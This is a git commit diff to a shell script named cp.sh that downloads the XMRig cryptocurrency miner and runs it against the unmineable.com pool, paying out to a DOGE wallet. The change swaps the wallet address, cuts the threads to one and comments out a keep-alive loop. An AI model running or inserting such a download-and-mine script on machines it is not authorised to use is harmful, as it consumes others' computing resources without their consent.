b0fbd66d5cc1e935b974034b1552820e924e8151
rafarogit <rafaro128@gmail.com>
2024-02-29 14:31:42 -0300

    Update cp.sh

--- cp.sh
+++ cp.sh
@@ -4,8 +4,8 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar xf xmrig-6.14.0-linux-x64.tar.gz
 cd xmrig-6.14.0
-./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.unmineable_worker_plkmjuxr#rup9-jjmz -p x --threads 4
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DSXfQwLuNLBHS4shPD241km3UCDVq6rXuZ.unmineable_worker_xezskipr#rup9-jjmz -p x --threads 1
+# while [ 1 ]; do
+# sleep 3
+# done
+# sleep 999
